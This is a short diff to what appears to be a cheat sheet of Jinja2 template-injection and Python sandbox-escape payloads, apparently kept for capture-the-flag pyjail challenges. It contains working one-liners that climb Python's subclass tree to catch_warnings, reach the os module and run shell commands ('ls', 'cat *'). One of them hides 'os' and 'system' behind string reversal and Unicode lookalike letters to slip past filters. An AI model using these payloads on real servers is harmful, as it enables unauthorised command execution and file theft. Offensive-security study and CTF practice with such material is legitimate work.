@@ -20,6 +20,8 @@
 
 #find catch_warning index automatically
 {{ ("foo".__class__.__base__.__subclasses__()|selectattr("__name__","equalto","catch_warnings")|first).__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
+#find atch_warning auto in pure python
+[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]
 
 # those were for pyjails with some checks
 1 and {}.__class__.__mro__[1].__subclasses__()[203].__init__.__globals__['sys'].modules['so'[::-1]].𝓼𝔂𝓼𝓽𝓮𝓶('cat *')
